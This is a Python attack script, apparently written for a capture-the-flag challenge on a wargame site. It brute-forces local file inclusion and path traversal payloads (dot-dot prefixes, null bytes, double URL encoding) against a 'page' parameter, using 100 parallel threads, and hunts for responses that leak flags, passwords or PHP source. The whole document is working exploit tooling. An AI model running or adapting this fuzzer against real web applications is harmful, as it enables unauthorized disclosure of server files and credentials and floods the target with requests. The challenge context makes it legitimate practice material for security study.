#!/usr/bin/env python3
import requests
import itertools
from concurrent.futures import ThreadPoolExecutor
import re

s = requests.Session()
base = "https://vip.hax.w3challs.com/"

print("[*] MASSIVE FINAL ATTACK...")

# Generar TODAS las combinaciones posibles
files = ["member", "admin", "flag", "secret", "login", "config", "auth", "vip", "army", "troops"]
prefixes = ["", ".", "..", "../", "./", "//", "\\", "real_", "true_", "orig_", "old_", "new_", "_"]
suffixes = ["", "%00", ".php", ".inc", ".txt", ".bak", "~", ".old", "/", "//", "%2500", "%00.php"]
encodings = [
    lambda x: x,  # Normal
    lambda x: x.upper(),  # Mayúsculas
    lambda x: x.lower(),  # Minúsculas
    lambda x: x.replace("/", "%2f"),  # URL encode /
    lambda x: x.replace("/", "%252f"),  # Double URL encode
    lambda x: x.replace(".", "%2e"),  # URL encode .
]

def test_payload(payload):
    try:
        r = s.get(f"{base}index.php?page={payload}", timeout=1)
        if len(r.text) not in [736, 1796] and len(r.text) > 0:
            # Buscar contenido interesante
            if 'flag' in r.text.lower() or 'password' in r.text.lower() or '<?php' in r.text:
                return (payload, r.text[:200])
            elif len(r.text) < 500:
                return (payload, f"{len(r.text)} bytes")
    except:
        pass
    return None

# Generar payloads
payloads = []
for file, prefix, suffix in itertools.product(files, prefixes, suffixes):
    for encode in encodings:
        payload = encode(f"{prefix}{file}{suffix}")
        payloads.append(payload)

print(f"Testing {len(payloads)} payloads...")

# Ejecutar en paralelo
with ThreadPoolExecutor(max_workers=100) as executor:
    results = list(executor.map(test_payload, payloads))

# Mostrar resultados
hits = [r for r in results if r]
for hit in hits:
    print(f"[!] HIT: {hit[0]} -> {hit[1]}")

# Si encontramos algo con flag
for hit in hits:
    if 'flag' in str(hit[1]).lower():
        print(f"\n[!!!] FLAG FOUND: {hit[0]}")
        r = s.get(f"{base}index.php?page={hit[0]}")
        print(r.text)